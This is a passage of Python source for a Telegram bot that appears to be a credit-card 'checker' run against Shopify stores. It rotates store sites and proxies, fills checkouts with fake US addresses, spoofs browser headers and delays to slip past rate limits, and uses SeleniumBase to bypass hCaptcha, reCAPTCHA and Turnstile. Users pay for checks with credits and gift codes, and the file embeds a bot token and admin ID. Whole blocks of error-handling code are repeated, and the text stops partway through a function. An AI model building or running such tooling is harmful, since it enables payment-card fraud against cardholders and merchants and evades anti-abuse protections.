import re
import json
import requests
from fake_useragent import UserAgent
import time
import random
import telebot
import string
import io
import sys
import logging
import os
import subprocess
from datetime import datetime
import hashlib
import threading
import math

import aiohttp
import asyncio
from urllib.parse import urlparse
from typing import Optional, Tuple

# CAPTCHA Bypassing Configuration (SeleniumBase UC Mode)
try:
    from seleniumbase import SB
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    
    # Suppress SSL warnings for mobile networks
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    ENABLE_CAPTCHA_SOLVING = True
    print(f"[✓] SeleniumBase imported successfully for CAPTCHA bypassing")
except ImportError:
    print("[!] SeleniumBase not installed. Run: pip install seleniumbase")
    print("[!] CAPTCHA solving will be disabled until SeleniumBase is installed")
    ENABLE_CAPTCHA_SOLVING = False
    import requests

BOT_TOKEN = '8537419261:AAESgIDFMkm8RIetavUM9ucQDV9t-o_omG4'
ADMIN_CHAT_ID = 8564010885

# Suppress verbose logging
logging.getLogger('telebot').setLevel(logging.CRITICAL)
logging.basicConfig(level=logging.CRITICAL)

# Initialize bot with threading support
bot = telebot.TeleBot(BOT_TOKEN, num_threads=10)

proxy_list = []

# JSON Database file
DATA_FILE = 'checker_data.json'

# ════════════════════════════════════════════════════════════════════════════════════════
# SHOPIFY SITES MANAGEMENT - AUTO SHOPIFY CHECKER
# ════════════════════════════════════════════════════════════════════════════════════════

# Global list to store validated Shopify sites
shopify_sites = []
# Lock for thread-safe site operations
sites_lock = threading.Lock()
# Current site index for rotation
current_site_index = 0

def get_current_site():
    """Get the current active site for checking."""
    global current_site_index
    with sites_lock:
        if not shopify_sites:
            return None
        if current_site_index >= len(shopify_sites):
            current_site_index = 0
        return shopify_sites[current_site_index]

def rotate_to_next_site():
    """Rotate to the next available site."""
    global current_site_index
    with sites_lock:
        if not shopify_sites:
            return None
        current_site_index = (current_site_index + 1) % len(shopify_sites)
        if shopify_sites:
            return shopify_sites[current_site_index]
        return None

def remove_current_site():
    """Remove the current site due to rate limiting and rotate to next."""
    global current_site_index
    with sites_lock:
        if not shopify_sites:
            return None
        if current_site_index < len(shopify_sites):
            removed_site = shopify_sites.pop(current_site_index)
            print(f"🚫 Removed site due to rate limit: {removed_site['url']}")
            if current_site_index >= len(shopify_sites) and shopify_sites:
                current_site_index = 0
            if shopify_sites:
                return shopify_sites[current_site_index]
        return None



# ════════════════════════════════════════════════════════════════════════════════════════
# PROXY ROTATION HELPER - ENHANCED FOR SESSION STABILITY
# ════════════════════════════════════════════════════════════════════════════════════════

proxy_rotation_index = 0
proxy_rotation_lock = threading.Lock()

def get_next_proxy():
    """Get next proxy from the list with rotation"""
    global proxy_rotation_index, proxy_list
    if not proxy_list:
        return None
    with proxy_rotation_lock:
        proxy_rotation_index = (proxy_rotation_index + 1) % len(proxy_list)
        return proxy_list[proxy_rotation_index]

def get_random_proxy():
    """Get random proxy from the list"""
    if not proxy_list:
        return None
    return random.choice(proxy_list)

def format_proxy_for_aiohttp(proxy_dict):
    """Convert proxy dict to aiohttp-compatible format with auth if needed"""
    if not proxy_dict:
        return None
    
    http_proxy = proxy_dict.get('http') or proxy_dict.get('https')
    if not http_proxy:
        return None
    
    # aiohttp expects proxy URL with protocol
    if not http_proxy.startswith('http'):
        http_proxy = f'http://{http_proxy}'
    
    return http_proxy


# ════════════════════════════════════════════════════════════════════════════════════════
# RATE LIMITING & THROTTLING - FOR 100+ CARD BULK CHECKING
# ════════════════════════════════════════════════════════════════════════════════════════

class RateLimitManager:
    """Manages rate limiting and adaptive throttling"""
    def __init__(self):
        self.rate_limit_detected = False
        self.rate_limit_timestamp = None
        self.rate_limit_cooldown = 30
        self.max_cooldown = 300
        self.consecutive_429_count = 0
        self.request_delay = 2
        self.adaptive_delay = 2
        
    def mark_rate_limited(self):
        """Mark that we hit a rate limit"""
        self.rate_limit_detected = True
        self.rate_limit_timestamp = time.time()
        self.consecutive_429_count += 1
        self.rate_limit_cooldown = min(self.rate_limit_cooldown * 1.5, self.max_cooldown)
        self.adaptive_delay = min(self.adaptive_delay * 1.3, 10)
        print(f"[!] Rate limit detected. Cooldown: {self.rate_limit_cooldown:.0f}s, Delay: {self.adaptive_delay:.1f}s")
    
    def reset_rate_limit(self):
        """Reset rate limit state"""
        self.rate_limit_detected = False
        self.consecutive_429_count = 0
        self.rate_limit_cooldown = 30
        self.adaptive_delay = 2
    
    def should_wait_for_cooldown(self):
        """Check if we should wait"""
        if not self.rate_limit_detected:
            return False
        elapsed = time.time() - self.rate_limit_timestamp
        return elapsed < self.rate_limit_cooldown
    
    def get_wait_time(self):
        """Get remaining wait time"""
        if not self.rate_limit_detected:
            return 0
        elapsed = time.time() - self.rate_limit_timestamp
        return max(0, self.rate_limit_cooldown - elapsed)
    
    def get_request_delay(self):
        """Get current request delay"""
        return self.adaptive_delay

rate_limit_manager = RateLimitManager()

REQUEST_DELAY_BASE = 1.5
REQUEST_DELAY_RANDOM = 0.5
GRAPHQL_DELAY = 0.8
RETRY_DELAY_BASE = 5
RETRY_BACKOFF_MULTIPLIER = 2

def generate_realistic_headers(user_agent=None):
    """Generate realistic browser headers"""
    if not user_agent:
        ua = UserAgent()
        user_agent = ua.random
    
    headers = {
        'User-Agent': user_agent,
        'Accept': 'application/json',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    
    if random.random() > 0.3:
        headers['Referer'] = random.choice([
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://duckduckgo.com/',
        ])
    
    return headers

def smart_delay(delay_type='request'):
    """Apply intelligent delay based on rate limit state"""
    if rate_limit_manager.should_wait_for_cooldown():
        wait_time = rate_limit_manager.get_wait_time()
        print(f"[⏳] Rate limit cooldown: waiting {wait_time:.0f}s...")
        time.sleep(wait_time)
        rate_limit_manager.reset_rate_limit()
    
    if delay_type == 'request':
        delay = rate_limit_manager.get_request_delay() + random.uniform(-0.2, 0.5)
    elif delay_type == 'graphql':
        delay = GRAPHQL_DELAY + random.uniform(0, 0.3)
    elif delay_type == 'retry':
        delay = RETRY_DELAY_BASE + random.uniform(0, 1)
    else:
        delay = REQUEST_DELAY_BASE + random.uniform(0, REQUEST_DELAY_RANDOM)
    
    time.sleep(max(0.1, delay))

def rotate_proxy_for_request():
    """Rotate proxy for each request"""
    if not proxy_list:
        return None
    return get_next_proxy()

SESSION_ERROR_PATTERNS = {
    'failed_session_token': [
        'Failed to get session token',
        'session token obtained',
        'serialized-session-token',
        'queueToken',
        'stableId'
    ],
    'checkout_error': [
        'checkout session',
        'checkout_url',
        'login',
        'requires login',
        'Site requires login'
    ],
    'product_fetch_error': [
        'Failed to fetch products',
        'product not found',
        'variant_id',
        'handle'
    ],
    'network_error': [
        'Connection error',
        'timeout',
        'ClientError',
        'Connection refused'
    ],
    'rate_limit': [
        'CAPTCHA',
        'rate limit',
        'too many requests',
        'captcha_metadata_missing',
        'recaptcha',
        'hcaptcha',
        'turnstile',
        'captcha required'
    ]
}

def detect_session_error(response_text, error_message):
    """
    Detect if an error is a session-related error that indicates the site is problematic
    
    Args:
        response_text: HTML/text response from the site
        error_message: Error message from the checker
        
    Returns:
        Tuple: (is_session_error, error_type, should_remove_site)
    """
    error_lower = str(error_message).lower()
    response_lower = str(response_text).lower() if response_text else ""
    
    # Check for session token failures
    if any(pattern.lower() in error_lower for pattern in SESSION_ERROR_PATTERNS['failed_session_token']):
        if 'failed to get session token' in error_lower:
            return True, 'SESSION_TOKEN_FAILED', True
    
    # Check for checkout errors
    if any(pattern.lower() in error_lower for pattern in SESSION_ERROR_PATTERNS['checkout_error']):
        if 'login' in error_lower or 'requires login' in error_lower:
            return True, 'CHECKOUT_LOGIN_REQUIRED', True
        if 'checkout' in error_lower:
            return True, 'CHECKOUT_ERROR', True
    
    # Check for product fetch errors
    if any(pattern.lower() in error_lower for pattern in SESSION_ERROR_PATTERNS['product_fetch_error']):
        if 'failed to fetch products' in error_lower:
            return True, 'PRODUCT_FETCH_FAILED', True
    
    # Check for network errors
    if any(pattern.lower() in error_lower for pattern in SESSION_ERROR_PATTERNS['network_error']):
        if 'connection' in error_lower or 'timeout' in error_lower:
            return True, 'NETWORK_ERROR', False  # Might be temporary, don't remove site
    
    # Check for rate limiting
    if any(pattern.lower() in error_lower for pattern in SESSION_ERROR_PATTERNS['rate_limit']):
        return True, 'RATE_LIMIT', True
    
    return False, 'UNKNOWN', False


def is_session_error_response(result_dict):
    """
    Check if a result dictionary indicates a session error
    
    Args:
        result_dict: Dictionary with 'status', 'resp_msg', 'error' keys
        
    Returns:
        Tuple: (is_error, error_type, should_remove_site)
    """
    if not isinstance(result_dict, dict):
        return False, 'UNKNOWN', False
    
    status = result_dict.get('status', '').lower()
    resp_msg = result_dict.get('resp_msg', '').lower()
    error = result_dict.get('error', '').lower()
    
    # Session token errors
    if 'failed to get session token' in resp_msg or 'failed to get session token' in error:
        return True, 'SESSION_TOKEN_FAILED', True
    
    # Checkout errors
    if 'site requires login' in resp_msg or 'requires login' in error:
        return True, 'CHECKOUT_LOGIN_REQUIRED', True
    
    if 'checkout' in resp_msg and 'error' in resp_msg:
        return True, 'CHECKOUT_ERROR', True
    
    # Product fetch errors
    if 'failed to fetch products' in resp_msg or 'product' in error and 'not found' in error:
        return True, 'PRODUCT_FETCH_FAILED', True
    
    # Network errors (might be temporary)
    if 'connection error' in resp_msg or 'timeout' in resp_msg:
        return True, 'NETWORK_ERROR', False
    
    # Rate limiting
    if 'rate limit' in resp_msg or 'captcha' in resp_msg:
        return True, 'RATE_LIMIT', True
    
    return False, 'UNKNOWN', False


# ════════════════════════════════════════════════════════════════════════════════════════
# ENHANCED SITE ROTATION WITH RETRY LOGIC
# ════════════════════════════════════════════════════════════════════════════════════════

def remove_site_and_retry(site_domain, username, card_details, proxy_to_use, max_retries=3):
    """
    Remove a problematic site and retry with the next available site
    
    Args:
        site_domain: Domain of the problematic site
        username: Username for the check
        card_details: Card details to check
        proxy_to_use: Proxy to use
        max_retries: Maximum number of retries with different sites
        
    Returns:
        Tuple: (result_dict, retry_count, removed_sites)
    """
    removed_sites = []
    retry_count = 0
    
    while retry_count < max_retries:
        # Remove current site
        removed = remove_current_site()
        if removed:
            removed_sites.append(removed['domain'])
            print(f"[!] Removed problematic site: {removed['domain']}")
        else:
            print(f"[!] No more sites available after removing {site_domain}")
            return None, retry_count, removed_sites
        
        # Get next site
        next_site = get_current_site()
        if not next_site:
            print(f"[!] No sites available for retry")
            return None, retry_count, removed_sites
        
        print(f"[*] Retrying with site: {next_site['domain']}")
        
        # Retry the check
        result = sh(card_details, username, proxy_to_use=proxy_to_use, site_data=next_site)
        
        # Check if result is valid (not a session error)
        if isinstance(result, dict):
            is_error, error_type, should_remove = is_session_error_response(result)
            if not is_error:
                # Success! Return the result
                return result, retry_count + 1, removed_sites
            elif should_remove:
                # This site also has issues, continue retrying
                retry_count += 1
                continue
            else:
                # Temporary error, return as is
                return result, retry_count + 1, removed_sites
        elif isinstance(result, str):
            is_error, error_type, should_remove = detect_session_error(result, result)
            if not is_error or not should_remove:
                # Not a session error or temporary, return as is
                return result, retry_count + 1, removed_sites
            else:
                # Session error, continue retrying
                retry_count += 1
                continue
        
        retry_count += 1
    
    print(f"[!] Max retries ({max_retries}) exceeded")
    return None, retry_count, removed_sites


# ════════════════════════════════════════════════════════════════════════════════════════
# RESPONSE MAPPING FOR SESSION ERRORS
# ════════════════════════════════════════════════════════════════════════════════════════

SESSION_ERROR_RESPONSES = {
    'SESSION_TOKEN_FAILED': 'Session initialization failed - Site removed and retrying',
    'CHECKOUT_LOGIN_REQUIRED': 'Checkout requires login - Site removed and retrying',
    'CHECKOUT_ERROR': 'Checkout error - Site removed and retrying',
    'PRODUCT_FETCH_FAILED': 'Product fetch failed - Site removed and retrying',
    'NETWORK_ERROR': 'Network error - Retrying with different site',
    'RATE_LIMIT': 'Rate limited - Site removed and retrying',
}

print("[✓] Session error detection and retry logic loaded successfully")


def detect_session_error(response_text, error_message):
    """
    Detect if an error is a session-related error that indicates the site is problematic
    
    Args:
        response_text: HTML/text response from the site
        error_message: Error message from the checker
        
    Returns:
        Tuple: (is_session_error, error_type, should_remove_site)
    """
    error_lower = str(error_message).lower()
    response_lower = str(response_text).lower() if response_text else ""
    
    # Check for session token failures
    if any(pattern.lower() in error_lower for pattern in SESSION_ERROR_PATTERNS['failed_session_token']):
        if 'failed to get session token' in error_lower:
            return True, 'SESSION_TOKEN_FAILED', True
    
    # Check for checkout errors
    if any(pattern.lower() in error_lower for pattern in SESSION_ERROR_PATTERNS['checkout_error']):
        if 'login' in error_lower or 'requires login' in error_lower:
            return True, 'CHECKOUT_LOGIN_REQUIRED', True
        if 'checkout' in error_lower:
            return True, 'CHECKOUT_ERROR', True
    
    # Check for product fetch errors
    if any(pattern.lower() in error_lower for pattern in SESSION_ERROR_PATTERNS['product_fetch_error']):
        if 'failed to fetch products' in error_lower:
            return True, 'PRODUCT_FETCH_FAILED', True
    
    # Check for network errors
    if any(pattern.lower() in error_lower for pattern in SESSION_ERROR_PATTERNS['network_error']):
        if 'connection' in error_lower or 'timeout' in error_lower:
            return True, 'NETWORK_ERROR', False  # Might be temporary, don't remove site
    
    # Check for rate limiting
    if any(pattern.lower() in error_lower for pattern in SESSION_ERROR_PATTERNS['rate_limit']):
        return True, 'RATE_LIMIT', True
    
    return False, 'UNKNOWN', False


def is_session_error_response(result_dict):
    """
    Check if a result dictionary indicates a session error
    
    Args:
        result_dict: Dictionary with 'status', 'resp_msg', 'error' keys
        
    Returns:
        Tuple: (is_error, error_type, should_remove_site)
    """
    if not isinstance(result_dict, dict):
        return False, 'UNKNOWN', False
    
    status = result_dict.get('status', '').lower()
    resp_msg = result_dict.get('resp_msg', '').lower()
    error = result_dict.get('error', '').lower()
    
    # Session token errors
    if 'failed to get session token' in resp_msg or 'failed to get session token' in error:
        return True, 'SESSION_TOKEN_FAILED', True
    
    # Checkout errors
    if 'site requires login' in resp_msg or 'requires login' in error:
        return True, 'CHECKOUT_LOGIN_REQUIRED', True
    
    if 'checkout' in resp_msg and 'error' in resp_msg:
        return True, 'CHECKOUT_ERROR', True
    
    # Product fetch errors
    if 'failed to fetch products' in resp_msg or 'product' in error and 'not found' in error:
        return True, 'PRODUCT_FETCH_FAILED', True
    
    # Network errors (might be temporary)
    if 'connection error' in resp_msg or 'timeout' in resp_msg:
        return True, 'NETWORK_ERROR', False
    
    # Rate limiting
    if 'rate limit' in resp_msg or 'captcha' in resp_msg:
        return True, 'RATE_LIMIT', True
    
    return False, 'UNKNOWN', False


# ════════════════════════════════════════════════════════════════════════════════════════
# ENHANCED SITE ROTATION WITH RETRY LOGIC
# ════════════════════════════════════════════════════════════════════════════════════════

def remove_site_and_retry(site_domain, username, card_details, proxy_to_use, max_retries=3):
    """
    Remove a problematic site and retry with the next available site
    
    Args:
        site_domain: Domain of the problematic site
        username: Username for the check
        card_details: Card details to check
        proxy_to_use: Proxy to use
        max_retries: Maximum number of retries with different sites
        
    Returns:
        Tuple: (result_dict, retry_count, removed_sites)
    """
    removed_sites = []
    retry_count = 0
    
    while retry_count < max_retries:
        # Remove current site
        removed = remove_current_site()
        if removed:
            removed_sites.append(removed['domain'])
            print(f"[!] Removed problematic site: {removed['domain']}")
        else:
            print(f"[!] No more sites available after removing {site_domain}")
            return None, retry_count, removed_sites
        
        # Get next site
        next_site = get_current_site()
        if not next_site:
            print(f"[!] No sites available for retry")
            return None, retry_count, removed_sites
        
        print(f"[*] Retrying with site: {next_site['domain']}")
        
        # Retry the check
        result = sh(card_details, username, proxy_to_use=proxy_to_use, site_data=next_site)
        
        # Check if result is valid (not a session error)
        if isinstance(result, dict):
            is_error, error_type, should_remove = is_session_error_response(result)
            if not is_error:
                # Success! Return the result
                return result, retry_count + 1, removed_sites
            elif should_remove:
                # This site also has issues, continue retrying
                retry_count += 1
                continue
            else:
                # Temporary error, return as is
                return result, retry_count + 1, removed_sites
        elif isinstance(result, str):
            is_error, error_type, should_remove = detect_session_error(result, result)
            if not is_error or not should_remove:
                # Not a session error or temporary, return as is
                return result, retry_count + 1, removed_sites
            else:
                # Session error, continue retrying
                retry_count += 1
                continue
        
        retry_count += 1
    
    print(f"[!] Max retries ({max_retries}) exceeded")
    return None, retry_count, removed_sites


# ════════════════════════════════════════════════════════════════════════════════════════
# RESPONSE MAPPING FOR SESSION ERRORS
# ════════════════════════════════════════════════════════════════════════════════════════

SESSION_ERROR_RESPONSES = {
    'SESSION_TOKEN_FAILED': 'Session initialization failed - Site removed and retrying',
    'CHECKOUT_LOGIN_REQUIRED': 'Checkout requires login - Site removed and retrying',
    'CHECKOUT_ERROR': 'Checkout error - Site removed and retrying',
    'PRODUCT_FETCH_FAILED': 'Product fetch failed - Site removed and retrying',
    'NETWORK_ERROR': 'Network error - Retrying with different site',
    'RATE_LIMIT': 'Rate limited - Site removed and retrying',
}

print("[✓] Session error detection and retry logic loaded successfully")


def add_site(site_url, product_id):
    """Add a new site to the list."""
    with sites_lock:
        # Extract domain from URL
        domain = site_url.replace('https://', '').replace('http://', '').rstrip('/')
        
        site_data = {
            'url': site_url if site_url.startswith('http') else f'https://{site_url}',
            'domain': domain,
            'product_id': str(product_id),
            'gateway': 'Shopify Payments',
            'added_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        shopify_sites.append(site_data)
        return site_data

def get_all_sites():
    """Get all added sites."""
    with sites_lock:
        return list(shopify_sites)

def clear_all_sites():
    """Clear all sites."""
    global current_site_index
    with sites_lock:
        shopify_sites.clear()
        current_site_index = 0

# ════════════════════════════════════════════════════════════════════════════════════════
# DATABASE MANAGEMENT FUNCTIONS
# ════════════════════════════════════════════════════════════════════════════════════════

def load_data():
    """Load data from JSON database file."""
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {'users': {}, 'gift_codes': {}, 'premium_users': {}, 'registered_users': {}}

def save_data(data):
    """Save data to JSON database file."""
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ════════════════════════════════════════════════════════════════════════════════════════
# USER MANAGEMENT FUNCTIONS
# ════════════════════════════════════════════════════════════════════════════════════════

def get_user_credits(user_id):
    """Get user credit balance."""
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        return data['users'][user_id_str].get('credits', 0)
    return 0

def add_user(user_id, username):
    """Add new user to database."""
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str not in data['users']:
        data['users'][user_id_str] = {
            'username': username,
            'credits': 0,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'is_premium': False,
            'is_registered': False,
            'registration_date': None
        }
        save_data(data)

def deduct_credit(user_id):
    """Deduct one credit from user account."""
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        if data['users'][user_id_str]['credits'] > 0:
            data['users'][user_id_str]['credits'] -= 1
            data['users'][user_id_str]['total_checks'] += 1
            save_data(data)

def add_credits(user_id, amount):
    """Add credits to user account."""
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        data['users'][user_id_str]['credits'] += amount
    else:
        data['users'][user_id_str] = {
            'username': 'Unknown',
            'credits': amount,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    save_data(data)

def generate_gift_code(credits, admin_id):
    """Generate a unique gift code with specified credits."""
    code = hashlib.md5(f"{time.time()}{random.randint(1000, 9999)}".encode()).hexdigest()[:12].upper()
    data = load_data()
    data['gift_codes'][code] = {
        'credits': credits,
        'created_by': admin_id,
        'created_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'is_used': False,
        'redeemed_by': None,
        'redeemed_date': None
    }
    save_data(data)
    return code

def is_user_premium(user_id):
    """Check if user has premium status."""
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        return data['users'][user_id_str].get('is_premium', False)
    return False

def is_user_registered(user_id):
    """Check if user has registered."""
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        return data['users'][user_id_str].get('is_registered', False)
    return False

def register_user(user_id):
    """Register user and grant 200 free credits (one-time only)."""
    data = load_data()
    user_id_str = str(user_id)
    
    if user_id_str not in data['users']:
        return False, "User not found. Please use /start first."
    
    user = data['users'][user_id_str]
    
    if user.get('is_registered', False):
        return False, "You have already registered! You can only register once."
    
    data['users'][user_id_str]['is_registered'] = True
    data['users'][user_id_str]['registration_date'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    data['users'][user_id_str]['credits'] += 200
    
    save_data(data)
    return True, 200

def make_user_premium(user_id):
    """Promote user to premium status."""
    data = load_data()
    user_id_str = str(user_id)
    
    if user_id_str not in data['users']:
        return False, "User not found."
    
    data['users'][user_id_str]['is_premium'] = True
    data['premium_users'][user_id_str] = {
        'user_id': user_id,
        'promoted_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'promoted_by': ADMIN_CHAT_ID
    }
    save_data(data)
    return True, "User promoted to premium."

def remove_user_premium(user_id):
    """Remove premium status from user."""
    data = load_data()
    user_id_str = str(user_id)
    
    if user_id_str not in data['users']:
        return False, "User not found."
    
    data['users'][user_id_str]['is_premium'] = False
    if user_id_str in data['premium_users']:
        del data['premium_users'][user_id_str]
    save_data(data)
    return True, "Premium status removed."

def redeem_gift_code(code, user_id):
    """Redeem a gift code and add credits to user."""
    data = load_data()
    code = code.upper()
    
    if code not in data['gift_codes']:
        return False, "Invalid gift code"
    
    gift = data['gift_codes'][code]
    
    if gift['is_used']:
        return False, "Gift code already used"
    
    data['gift_codes'][code]['is_used'] = True
    data['gift_codes'][code]['redeemed_by'] = user_id
    data['gift_codes'][code]['redeemed_date'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    credits = gift['credits']
    user_id_str = str(user_id)
    
    if user_id_str not in data['users']:
        data['users'][user_id_str] = {
            'username': 'Unknown',
            'credits': 0,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    
    data['users'][user_id_str]['credits'] += credits
    save_data(data)
    
    return True, credits

# ════════════════════════════════════════════════════════════════════════════════════════
# DATA STRUCTURES & LOOKUP TABLES
# ════════════════════════════════════════════════════════════════════════════════════════

us_addresses = [
    {"address1": "123 Main St", "address2": "", "city": "New York", "countryCode": "US", "postalCode": "10001", "zoneCode": "NY", "lastName": "Doe", "firstName": "John"},
    {"address1": "456 Oak Ave", "address2": "", "city": "Los Angeles", "countryCode": "US", "postalCode": "90001", "zoneCode": "CA", "lastName": "Smith", "firstName": "Emily"},
    {"address1": "789 Pine Rd", "address2": "", "city": "Chicago", "countryCode": "US", "postalCode": "60601", "zoneCode": "IL", "lastName": "Johnson", "firstName": "Alex"},
    {"address1": "101 Elm St", "address2": "", "city": "Houston", "countryCode": "US", "postalCode": "77001", "zoneCode": "TX", "lastName": "Miller", "firstName": "Nico"},
    {"address1": "202 Maple Dr", "address2": "", "city": "Phoenix", "countryCode": "US", "postalCode": "85001", "zoneCode": "AZ", "lastName": "Brown", "firstName": "Tom"},
    {"address1": "303 Cedar Ln", "address2": "", "city": "Philadelphia", "countryCode": "US", "postalCode": "19101", "zoneCode": "PA", "lastName": "Davis", "firstName": "Sarah"},
    {"address1": "404 Birch Blvd", "address2": "", "city": "San Antonio", "countryCode": "US", "postalCode": "78201", "zoneCode": "TX", "lastName": "Wilson", "firstName": "Liam"},
    {"address1": "505 Walnut St", "address2": "", "city": "San Diego", "countryCode": "US", "postalCode": "92101", "zoneCode": "CA", "lastName": "Moore", "firstName": "Emma"},
    {"address1": "606 Spruce Ave", "address2": "", "city": "Dallas", "countryCode": "US", "postalCode": "75201", "zoneCode": "TX", "lastName": "Taylor", "firstName": "Oliver"},
    {"address1": "707 Ash Rd", "address2": "", "city": "San Jose", "countryCode": "US", "postalCode": "95101", "zoneCode": "CA", "lastName": "Anderson", "firstName": "Ava"},
]

first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam", "Emma", "Oliver", "Ava"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore", "Taylor", "Anderson", "Thomas"]

# ════════════════════════════════════════════════════════════════════════════════════════
# UTILITY & HELPER FUNCTIONS
# ════════════════════════════════════════════════════════════════════════════════════════

def get_random_proxy():
    """Get a random proxy from the list."""
    if proxy_list:
        return random.choice(proxy_list)
    return None

def get_bin_info(bin_number):
    """Get BIN information from API."""
    try:
        url = f"https://lookup.binlist.net/{bin_number}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            
            scheme = data.get('scheme', 'UNKNOWN').upper()
            card_type = data.get('type', 'UNKNOWN').upper()
            brand = data.get('brand', 'UNKNOWN').upper()
            bank_name = data.get('bank', {}).get('name', 'UNKNOWN').upper()
            country_name = data.get('country', {}).get('name', 'UNKNOWN').upper()
            country_emoji = data.get('country', {}).get('emoji', '🌍')
            
            return {
                'scheme': scheme,
                'type': card_type,
                'brand': brand,
                'bank': bank_name,
                'country': country_name,
                'emoji': country_emoji
            }
    except:
        pass
    
    return {
        'scheme': 'UNKNOWN',
        'type': 'UNKNOWN',
        'brand': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'emoji': '🌍'
    }

def random_delay(min_sec=0.3, max_sec=0.5):
    """Add random delay to mimic human behavior."""
    delay = random.uniform(min_sec, max_sec)
    time.sleep(delay)
    print(f"⏳ Random delay: {delay:.2f}s")

def get_random_address():
    """Get a random US address for anonymity."""
    return random.choice(us_addresses)

def create_batches(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

# ════════════════════════════════════════════════════════════════════════════════════════
# SELENIUMBASE CAPTCHA BYPASS INTEGRATION (FREE)
# ════════════════════════════════════════════════════════════════════════════════════════

def solve_captcha_with_seleniumbase(sitekey, page_url, captcha_type='recaptcha'):
    """
    Solve CAPTCHA using SeleniumBase UC Mode (Free Bypassing Tool)
    
    Args:
        sitekey: The CAPTCHA sitekey
        page_url: The URL where the CAPTCHA appears
        captcha_type: Type of CAPTCHA ('recaptcha', 'hcaptcha', 'turnstile')
        
    Returns:
        str: Solved token or None if failed
    """
    if not ENABLE_CAPTCHA_SOLVING:
        print("[!] CAPTCHA solving is disabled")
        return None
    
    try:
        print(f"[*] Solving {captcha_type} CAPTCHA with SeleniumBase UC Mode...")
        print(f"    URL: {page_url}")
        
        # Using SeleniumBase SB manager for automatic virtual display on Linux
        with SB(uc=True, incognito=True, xvfb=True) as sb:
            # Open the page with reconnect to bypass detection
            sb.uc_open_with_reconnect(page_url, reconnect_time=5)
            
            # Handle the CAPTCHA based on type
            print(f"[*] Attempting to handle {captcha_type}...")
            sb.uc_gui_handle_captcha()
            
            # Wait for the token to be generated
            time.sleep(5)
            
            # Extract token based on CAPTCHA type
            token = None
            if captcha_type.lower() == 'hcaptcha':
                token = sb.get_attribute('textarea[name="h-captcha-response"]', "value")
                if not token:
                    token = sb.execute_script("return hcaptcha.getResponse();")
            elif captcha_type.lower() == 'recaptcha':
                token = sb.get_attribute('textarea[name="g-recaptcha-response"]', "value")
                if not token:
                    token = sb.execute_script("return grecaptcha.getResponse();")
            elif captcha_type.lower() == 'turnstile':
                token = sb.get_attribute('input[name="cf-turnstile-response"]', "value")
            
            if token:
                print(f"[✓] {captcha_type} solved successfully!")
                return token
            
            print(f"[✗] Failed to obtain {captcha_type} token")
            return None
            
    except Exception as e:
        print(f"[!] Error solving CAPTCHA with SeleniumBase: {str(e)}")
        return None


def solve_captcha_with_retry(sitekey, page_url, captcha_type='recaptcha', max_retries=3):
    """
    Solve CAPTCHA with retry logic
    
    Args:
        sitekey: The CAPTCHA sitekey
        page_url: The URL where the CAPTCHA appears
        captcha_type: Type of CAPTCHA
        max_retries: Maximum number of retry attempts
        
    Returns:
        str: Solved token or None if all retries failed
    """
    for attempt in range(1, max_retries + 1):
        print(f"[*] CAPTCHA solving attempt {attempt}/{max_retries}")
        
        token = solve_captcha_with_seleniumbase(sitekey, page_url, captcha_type)
        
        if token:
            return token
        
        if attempt < max_retries:
            wait_time = 5 * attempt  # Increasing backoff
            print(f"[*] Waiting {wait_time}s before retry...")
            time.sleep(wait_time)
    
    print(f"[✗] All {max_retries} CAPTCHA solving attempts failed")
    return None


def extract_captcha_sitekey(html_text):
    """
    Extract CAPTCHA sitekey from Shopify page HTML with accurate pattern matching
    DEBUG VERSION - will save HTML for inspection
    
    Returns:
        tuple: (sitekey, captcha_type) or (None, None) if not found
    """
    print("[*] Attempting to extract CAPTCHA sitekey from page...")
    
    # Save the HTML for debugging
    with open('debug_captcha_page.html', 'w', encoding='utf-8') as f:
        f.write(html_text)
    print("[*] Saved HTML to debug_captcha_page.html for inspection")
    
    # Standard Shopify hCaptcha sitekey (used by many stores)
    STANDARD_SHOPIFY_HCAPTCHA = "4c672d35-03a7-4e17-8e66-a43901f0d56c"
    
    # First, check if the standard Shopify hCaptcha sitekey appears anywhere in the HTML
    if STANDARD_SHOPIFY_HCAPTCHA in html_text:
        print(f"[✓] Found standard Shopify hCaptcha sitekey: {STANDARD_SHOPIFY_HCAPTCHA}")
        # Check if hcaptcha is mentioned anywhere in the page
        if 'hcaptcha' in html_text.lower() or 'h-captcha' in html_text.lower():
            print(f"[✓] hCaptcha mentioned in page, using standard sitekey")
            return STANDARD_SHOPIFY_HCAPTCHA, 'hcaptcha'
    
